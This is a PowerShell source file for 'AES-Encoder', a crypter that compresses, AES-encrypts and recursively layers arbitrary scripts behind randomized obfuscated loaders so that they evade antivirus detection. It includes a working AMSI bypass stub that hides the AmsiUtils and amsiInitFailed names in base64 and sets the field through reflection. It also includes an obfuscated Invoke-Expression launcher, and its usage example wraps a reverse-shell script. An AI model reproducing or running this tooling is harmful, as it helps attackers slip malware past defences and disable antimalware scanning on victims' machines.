#    AES-Encoder - PowerShell crypter
#    Copyright (C) 2022 Chainski
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
#    Made by https://github.com/chainski


# CONFIG
$script:AESConfig = @{
    MinVarLength         = 14
    MaxVarLength         = 18
    MinChunkSize         = 4
    MaxChunkSize         = 6
    MinMbaReplacements   = 0
    MaxMbaReplacements   = 1
    MinDecReplacements   = 1
    MaxDecReplacements   = 2
    MinHexReplacements   = 1
    MaxHexReplacements   = 2
    UseHexOrDecimal      = $false
    UseMBA               = $false
    MinMathObf           = 100
    MaxMathObf           = 10000
    DefaultIterations    = 4
    DefaultCompression   = 'Random'
    IncludeAMSIStub      = $true
}
try { $host.UI.RawUI.WindowTitle = 'Powershell AES-Encoder' } catch {}
Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$PSDefaultParameterValues['*:ErrorAction'] = 'Stop'
$script:NL = [string][char]13 + [string][char]10
Write-Host '[DEBUG] AES-Encoder initialized' -ForegroundColor DarkGray


function RandomFragment {
    $cfg = $script:AESConfig
    $len = Get-Random -Minimum $cfg.MinVarLength -Maximum ($cfg.MaxVarLength + 1)
    $letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'.ToCharArray()
    $all     = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'.ToCharArray()
    $sb = [string]$letters[(Get-Random -Minimum 0 -Maximum $letters.Length)]
    for ($j = 1; $j -lt $len; $j++) {
        $sb += $all[(Get-Random -Minimum 0 -Maximum $all.Length)]
    }
    Write-Host ('[DEBUG] [RandomFragment] {0} (len={1})' -f $sb, $sb.Length) -ForegroundColor DarkGray
    return $sb
}

function Get-MixedCase {
    param([Parameter(Mandatory)][string]$Text)
    $chars = $Text.ToCharArray()
    for ($i = 0; $i -lt $chars.Length; $i++) {
        $ch = $chars[$i]
        if ($ch -ge 'A' -and $ch -le 'Z') {
            if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) { $chars[$i] = [char]([int]$ch + 32) }
        } elseif ($ch -ge 'a' -and $ch -le 'z') {
            if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) { $chars[$i] = [char]([int]$ch - 32) }
        }
    }
    return -join $chars
}

function New-TypeToken {
    param([Parameter(Mandatory)][string]$TypeName)
    return '[' + (Get-MixedCase $TypeName) + ']'
}

function New-InvokeToken {
    return '.' + (ObfName (Get-MixedCase 'Invoke'))
}

function NewObfIex {
    $parts = foreach ($ch in 'i','e','x') {
        $code   = [int][char]$ch
        $x      = Get-Random -Minimum 1000 -Maximum 10000
        $y      = Get-Random -Minimum 1000 -Maximum 10000
        $offset = $x + $y - $code
        '[char](({0}-band{1})+({0}-bor{1})-{2})' -f $x, $y, $offset
    }
    $result = '.(' + ($parts -join '+') + ')'
    Write-Host ('[DEBUG] [NewObfIex] {0}' -f $result) -ForegroundColor DarkGray
    return $result
}

function New-StaticMember {
    param([Parameter(Mandatory)][string]$Name)
    return '::' + (ObfName $Name)
}

function New-StaticAccess {
    param(
        [Parameter(Mandatory)][string]$TypeName,
        [Parameter(Mandatory)][string]$MemberName
    )
    return (New-TypeToken $TypeName) + (New-StaticMember $MemberName)
}

function GetMathObf {
    param([int]$Value)
    $cfg = $script:AESConfig
    $x      = Get-Random -Minimum $cfg.MinMathObf -Maximum $cfg.MaxMathObf
    $y      = Get-Random -Minimum $cfg.MinMathObf -Maximum $cfg.MaxMathObf
    $offset = $x + $y - $Value
    $result = ('{0}(({1} -band {2})+({1} -bor {2})-{3})' -f (New-TypeToken 'int'), $x, $y, $offset)
    Write-Host ('[DEBUG] [GetMathObf] {0} -> {1}' -f $Value, $result) -ForegroundColor DarkGray
    return $result
}

function New-CharToken {
    param(
        [Parameter(Mandatory)][char]$Ch,
        [ValidateSet('hex','dec','mba')]
        [string]$Style = 'dec'
    )
    $cfg = $script:AESConfig
    $code = [int][char]$Ch
    $tChar = New-TypeToken 'char'
    switch ($Style) {
        'hex' { return ('{0}(0x{1:X})' -f $tChar, $code) }
        'mba' {
            $x = Get-Random -Minimum $cfg.MinMathObf -Maximum $cfg.MaxMathObf
            $y = Get-Random -Minimum $cfg.MinMathObf -Maximum $cfg.MaxMathObf
            $offset = $x + $y - $code
            return ('{0}(({1} -band {2}) + ({1} -bor {2}) - {3})' -f $tChar, $x, $y, $offset)
        }
        default { return ('{0}({1})' -f $tChar, $code) }
    }
}

function Get-ReplaceCount {
    param([int]$Min, [int]$Max, [int]$Cap)
    if ($Cap -le 0) { return 0 }
    $lo = [Math]::Max(0, $Min)
    $hi = [Math]::Max($lo, $Max)
    $n = Get-Random -Minimum $lo -Maximum ($hi + 1)
    if ($n -gt $Cap) { $n = $Cap }
    return $n
}


function ObfName {
    param([Parameter(Mandatory)][string]$Name)
    $cfg = $script:AESConfig
    $len = $Name.Length
    $replaceAt = @{}
    if ($len -gt 0) {
        $pool = New-Object System.Collections.Generic.List[int]
        0..($len - 1) | ForEach-Object { $pool.Add($_) }
        $plan = @()
        if ($cfg.UseMBA) {
            $plan += ,@('mba', (Get-ReplaceCount $cfg.MinMbaReplacements $cfg.MaxMbaReplacements $pool.Count))
        }
        if ($cfg.UseHexOrDecimal) {
            $plan += ,@('dec', (Get-ReplaceCount $cfg.MinDecReplacements $cfg.MaxDecReplacements $pool.Count))
            $plan += ,@('hex', (Get-ReplaceCount $cfg.MinHexReplacements $cfg.MaxHexReplacements $pool.Count))
        }
        foreach ($item in $plan) {
            $style = $item[0]
            $need  = [int]$item[1]
            if ($need -le 0 -or $pool.Count -eq 0) { continue }
            if ($need -gt $pool.Count) { $need = $pool.Count }
            $picked = @($pool | Get-Random -Count $need)
            foreach ($idx in $picked) {
                $replaceAt[$idx] = $style
                [void]$pool.Remove($idx)
            }
        }
    }
    $parts = New-Object System.Collections.Generic.List[string]
    $i = 0
    while ($i -lt $len) {
        if ($replaceAt.ContainsKey($i)) {
            $parts.Add((New-CharToken -Ch $Name[$i] -Style $replaceAt[$i]))
            $i++
            continue
        }
        $j = $i
        while ($j -lt $len -and -not $replaceAt.ContainsKey($j)) { $j++ }
        $run = $Name.Substring($i, ($j - $i))
        $p = 0
        while ($p -lt $run.Length) {
            $left = $run.Length - $p
            if ($left -eq 1) {
                $parts.Add((New-CharToken -Ch $run[$p] -Style 'dec'))
                $p++
                continue
            }
            $min = [Math]::Min($cfg.MinChunkSize, $left)
            if ($min -lt 2) { $min = 2 }
            $max = [Math]::Min($cfg.MaxChunkSize, $left)
            if ($max -lt $min) { $max = $min }
            $take = Get-Random -Minimum $min -Maximum ($max + 1)
            $parts.Add("'" + $run.Substring($p, $take) + "'")
            $p += $take
        }
        $i = $j
    }
    $expr = '(' + (@($parts) -join ' + ') + ')'
    Write-Host ('[DEBUG] [ObfName] {0} -> {1}' -f $Name, $expr) -ForegroundColor DarkGray
    return $expr
}

function ObfStaticMember {
    param([Parameter(Mandatory)][string]$Name)
    return (ObfName $Name)
}

function ObfDotMember {
    param([Parameter(Mandatory)][string]$Name)
    return (ObfName $Name)
}

function Escape-SingleQuoted {
    param([Parameter(Mandatory)][string]$Value)
    return $Value.Replace("'", "''")
}

# AMSI Bypass more can be found at https://amsi.fail
function New-AmsiStub {
    $nAsm = RandomFragment
    $nGt  = RandomFragment
    $nGf  = RandomFragment
    $nSv  = RandomFragment
    $t1   = RandomFragment
    $t2   = RandomFragment
    $t3   = RandomFragment
    $t4   = RandomFragment
    $vRef = RandomFragment
    $vTyp = RandomFragment
    $vFld = RandomFragment
    $inv = New-InvokeToken
    $tString = New-TypeToken 'string'
    $tRef    = New-TypeToken 'ref'
    $fromB64 = New-StaticAccess 'Convert' 'FromBase64String'
    $newStr  = $tString + (New-StaticMember 'new')
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add(('${0} = {1}' -f $nAsm, (ObfDotMember 'Assembly')))
    $lines.Add(('${0} = {1}' -f $nGt,  (ObfDotMember 'GetType')))
    $lines.Add(('${0} = {1}' -f $nGf,  (ObfDotMember 'GetField')))
    $lines.Add(('${0} = {1}' -f $nSv,  (ObfDotMember 'SetValue')))
    $lines.Add(('${0} = {1}({2}(''U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdA==''))' -f $t1, $newStr, $fromB64))
    $lines.Add(('${0} = {1}({2}(''aW9uLkFtc2lVdGlscw==''))' -f $t2, $newStr, $fromB64))
    $lines.Add(('${0} = {1}({2}(''YW1zaUluaXRGYWlsZWQ=''))' -f $t3, $newStr, $fromB64))
    $lines.Add(('${0} = {1}({2}(''Tm9uUHVibGljLFN0YXRpYw==''))' -f $t4, $newStr, $fromB64))
    $lines.Add(('${0} = {1}.${2}' -f $vRef, $tRef, $nAsm))
    $lines.Add(('${0} = ${1}.${2}{3}((${4}+${5}))' -f $vTyp, $vRef, $nGt, $inv, $t1, $t2))
    $lines.Add(('${0} = ${1}.${2}{3}(${4},${5})' -f $vFld, $vTyp, $nGf, $inv, $t3, $t4))
    $lines.Add(('${0}.${1}{2}((100-100),(200 -eq 200))' -f $vFld, $nSv, $inv))
    return ($lines -join $script:NL)
}

# AES
function New-AesDecodeStub {
    param([Parameter(Mandatory)][string]$B64Payload,[Parameter(Mandatory)][string]$B64Key,[Parameter(Mandatory)][string]$CompTypeName)
    $v = @{
        p      = RandomFragment
        k      = RandomFragment
        aes    = RandomFragment
        dec    = RandomFragment
        pt     = RandomFragment
        msIn   = RandomFragment
        msOut  = RandomFragment
        decmp  = RandomFragment
        text   = RandomFragment
        nMode  = RandomFragment
        nBlk   = RandomFragment
        nKsz   = RandomFragment
        nKey   = RandomFragment
        nIv    = RandomFragment
        nCdec  = RandomFragment
        nTfb   = RandomFragment
        nLen   = RandomFragment
        nCopy  = RandomFragment
        nCls   = RandomFragment
        nDisp  = RandomFragment
        nArr   = RandomFragment
        nGstr  = RandomFragment
        enc    = RandomFragment
        arr    = RandomFragment
    }
    $b64p = Escape-SingleQuoted $B64Payload
    $b64k = Escape-SingleQuoted $B64Key
    $inv  = New-InvokeToken
    $tByteArr = New-TypeToken 'byte[]'
    $fromB64  = New-StaticAccess 'Convert' 'FromBase64String'
    $aesNew   = New-StaticAccess 'Security.Cryptography.Aes' 'Create'
    $cbcVal   = New-StaticAccess 'Security.Cryptography.CipherMode' 'Cbc'
    $msNew    = New-StaticAccess 'IO.MemoryStream' 'new'
    $modeDec  = New-StaticAccess 'IO.Compression.CompressionMode' 'Decompress'
    $cmpNew   = New-StaticAccess ('IO.Compression.' + $CompTypeName) 'new'
    $utf8Prop = New-StaticAccess 'Text.Encoding' 'Utf8'
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add(('${0} = {1}' -f $v.nMode, (ObfDotMember 'Mode')))
    $lines.Add(('${0} = {1}' -f $v.nBlk,  (ObfDotMember 'BlockSize')))
    $lines.Add(('${0} = {1}' -f $v.nKsz,  (ObfDotMember 'KeySize')))
    $lines.Add(('${0} = {1}' -f $v.nKey,  (ObfDotMember 'Key')))
    $lines.Add(('${0} = {1}' -f $v.nIv,   (ObfDotMember 'Iv')))
    $lines.Add(('${0} = {1}' -f $v.nCdec, (ObfDotMember 'CreateDecryptor')))
    $lines.Add(('${0} = {1}' -f $v.nTfb,  (ObfDotMember 'TransformFinalBlock')))
    $lines.Add(('${0} = {1}' -f $v.nLen,  (ObfDotMember 'Length')))
    $lines.Add(('${0} = {1}' -f $v.nCopy, (ObfDotMember 'CopyTo')))
    $lines.Add(('${0} = {1}' -f $v.nCls,  (ObfDotMember 'Close')))
    $lines.Add(('${0} = {1}' -f $v.nDisp, (ObfDotMember 'Dispose')))
    $lines.Add(('${0} = {1}' -f $v.nArr,  (ObfDotMember 'ToArray')))
    $lines.Add(('${0} = {1}' -f $v.nGstr, (ObfDotMember 'GetString')))
    $lines.Add(('${0} = {1}(''{2}'')' -f $v.p, $fromB64, $b64p))
    $lines.Add(('${0} = {1}(''{2}'')' -f $v.k, $fromB64, $b64k))
    $lines.Add(('${0} = {1}()' -f $v.aes, $aesNew))
    $lines.Add(('${0}.${1} = {2}' -f $v.aes, $v.nMode, $cbcVal))
    $lines.Add(('${0}.${1} = {2}' -f $v.aes, $v.nBlk, (GetMathObf 128)))
    $lines.Add(('${0}.${1} = {2}' -f $v.aes, $v.nKsz, (GetMathObf 256)))
    $lines.Add(('${0}.${1} = ${2}' -f $v.aes, $v.nKey, $v.k))
    $lines.Add(('${0}.${1} = ${2}[0..15]' -f $v.aes, $v.nIv, $v.p))
    $lines.Add(('${0} = ${1}.${2}{3}()' -f $v.dec, $v.aes, $v.nCdec, $inv))
    $lines.Add(('${0} = ${1}.${2}{3}(${4},16,(${4}.${5} - 16))' -f $v.pt, $v.dec, $v.nTfb, $inv, $v.p, $v.nLen))
    $lines.Add(('${0} = {1}({2}${3})' -f $v.msIn, $msNew, $tByteArr, $v.pt))
    $lines.Add(('${0} = {1}()' -f $v.msOut, $msNew))
    $lines.Add(('${0} = {1}(${2}, {3})' -f $v.decmp, $cmpNew, $v.msIn, $modeDec))
    $lines.Add(('${0}.${1}{2}(${3})' -f $v.decmp, $v.nCopy, $inv, $v.msOut))
    $lines.Add(('${0}.${1}{2}()' -f $v.decmp, $v.nCls, $inv))
    $lines.Add(('${0}.${1}{2}()' -f $v.aes, $v.nDisp, $inv))
    $lines.Add(('${0}.${1}{2}()' -f $v.msIn, $v.nCls, $inv))
    $lines.Add(('${0} = ${1}.${2}{3}()' -f $v.arr, $v.msOut, $v.nArr, $inv))
    $lines.Add(('${0} = {1}' -f $v.enc, $utf8Prop))
    $lines.Add(('${0} = ${1}.${2}{3}(${4})' -f $v.text, $v.enc, $v.nGstr, $inv, $v.arr))
    $lines.Add((NewObfIex) + '($' + $v.text + ')')

    return ($lines -join $script:NL)
}

function InvokeAESEncoder {
	<#
    .SYNOPSIS

    AES-Encoder takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
	It also lets you layer this recursively however many times you want in order to foil dynamic & heuristic detection.

    .DESCRIPTION

     AES-Encoder takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
     The output script is highly randomized in order to make static analysis even more difficut.
     It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.


    .PARAMETER InFile
    Specifies the script to obfuscate/encrypt.

    .PARAMETER OutFile
    Specifies the output script.

    .PARAMETER Iterations
    The number of times the PowerShell script will be packed & crypted recursively. Default is 4.

    .EXAMPLE

    PS> .\AES-Encoder.ps1 -i reverse-shell.ps1 -o obfuscated.ps1 -Iterations 5

    .LINK

    https://github.com/chainski/AES-Encoder

    #>
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [Alias('i')]
        [string] $infile,
        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [Alias('o')]
        [string] $outfile,
        [Parameter(Mandatory = $false, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [Alias('n')]
        [string] $iterations
    )
    Process {
        if (-not $PSBoundParameters.ContainsKey('iterations')) {
            $iterations = $script:AESConfig.DefaultIterations
        }
        $cfg = $script:AESConfig
        Write-Host ''
        Write-Host -ForegroundColor Red   "  #####  ####### #######     ####### ###    ##  ######  ######  ######  ####### ######  "
        Write-Host -ForegroundColor White " ##   ## ##      ##          ##      ####   ## ##      ##    ## ##   ## ##      ##   ## "
        Write-Host -ForegroundColor Red   " ####### #####   #######     #####   ## ##  ## ##      ##    ## ##   ## #####   ######  "
        Write-Host -ForegroundColor White " ##   ## ##           ##     ##      ##  ## ## ##      ##    ## ##   ## ##      ##   ## "
        Write-Host -ForegroundColor Red   " ##   ## ####### #######     ####### ##   ####  ######  ######  ######  ####### ##   ## "
        Write-Host -ForegroundColor Blue  "                         +=========================================+                    "
        Write-Host -ForegroundColor White "                         |          AES Encoder 1.0.0.0            |                    "
        Write-Host -ForegroundColor Blue  "                         |           coded by Chainski             |                    "
        Write-Host -ForegroundColor White "                         |      For Educational Purposes Only      |                    "
        Write-Host -ForegroundColor Red   "                         |                 Github                  |                    "
        Write-Host -ForegroundColor White "                         | https://github.com/chainski/AES-Encoder |                    "
        Write-Host -ForegroundColor Blue  "                         +=========================================+                    "
        Write-Host ''
        Write-Host ('[DEBUG] InFile     = {0}' -f $infile)     -ForegroundColor DarkGray
        Write-Host ('[DEBUG] OutFile    = {0}' -f $outfile)    -ForegroundColor DarkGray
        Write-Host ('[DEBUG] Iterations = {0}' -f $iterations) -ForegroundColor DarkGray
        if (-not (Test-Path -LiteralPath $infile -PathType Leaf)) {
            throw ('Input file does not exist: {0}' -f $infile)
        }
        $codebytes = [System.IO.File]::ReadAllBytes($infile)
        Write-Host ('[DEBUG] Read {0} bytes' -f $codebytes.Length) -ForegroundColor DarkGray
        $code      = $null
        $amsiFinal = ''
        try {
            for ($i = 1; $i -le [int]$iterations; $i++) {
                Write-Host ('[DEBUG] --- Iteration {0} / {1} ---' -f $i, $iterations) -ForegroundColor DarkGray
                Write-Host '[*] Starting Encryption Process ...' -ForegroundColor Red
                if ($cfg.DefaultCompression -eq 'Random') {
                    $compressiontype = ('Gzip','Deflate') | Get-Random
                } else {
                    $compressiontype = $cfg.DefaultCompression
                }
                $compTypeName = [string]$compressiontype + 'Stream'
                Write-Host ('[DEBUG] Compression={0} CipherMode=CBC KeySize=256' -f $compressiontype) -ForegroundColor DarkGray
                Write-Host '[*] Compressing ...'
                $output = New-Object IO.MemoryStream
                if ($compressiontype -eq 'Gzip') {
                    $compressionStream = New-Object IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
                } else {
                    $compressionStream = New-Object IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
                }
                $compressionStream.Write($codebytes, 0, $codebytes.Length)
                $compressionStream.Close()
                $output.Close()
                $compressedBytes = $output.ToArray()
                Write-Host ('[DEBUG] Compressed payload = {0} bytes' -f $compressedBytes.Length) -ForegroundColor DarkGray
                Write-Host '[*] Generating Encryption Key ...'
                $aes = [Security.Cryptography.Aes]::Create()
                $aes.BlockSize = 128
                $aes.KeySize   = 256
                $aes.GenerateKey()
                $b64key = [Convert]::ToBase64String($aes.Key)
                Write-Host ('[DEBUG] AES Key b64 length = {0}' -f $b64key.Length) -ForegroundColor DarkGray
                Write-Host '[*] Encrypting with AES ...' -ForegroundColor Red
                $encryptor     = $aes.CreateEncryptor()
                $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length)
                [byte[]] $fullData = $aes.IV + $encryptedData
                $aes.Dispose()
                $b64encrypted  = [Convert]::ToBase64String($fullData)
                Write-Host ('[DEBUG] Encrypted payload b64 length = {0}' -f $b64encrypted.Length) -ForegroundColor DarkGray
                Write-Host '[*] Obfuscating Layers ...'
                $code = New-AesDecodeStub -B64Payload $b64encrypted -B64Key $b64key -CompTypeName $compTypeName
                if ($cfg.IncludeAMSIStub) {
                    $amsiFinal = (New-AmsiStub) + $script:NL
                } else {
                    $amsiFinal = ''
                }
                $codebytes = [Text.Encoding]::UTF8.GetBytes($code)
                Write-Host ('[DEBUG] Iteration {0} complete = {1} bytes' -f $i, $codebytes.Length) -ForegroundColor DarkGray
            }
            $finalOutput = $amsiFinal + $code
            Write-Host ('[*] Writing {0} ...' -f $outfile)
            [IO.File]::WriteAllText($outfile, $finalOutput)
            Write-Output '[+] Done!'
            Write-Host '[DEBUG] InvokeAESEncoder finished successfully' -ForegroundColor DarkGray
        }
        catch {
            Write-Host ('[DEBUG] Exception: {0}' -f $_.Exception.Message) -ForegroundColor DarkGray
            Write-Warning ('[!] AES-Encoder failed on {0}: {1}' -f $infile, $_.Exception.Message)
            throw
        }
    }
}
if ($MyInvocation.InvocationName -ne '.') {
    InvokeAESEncoder @args
}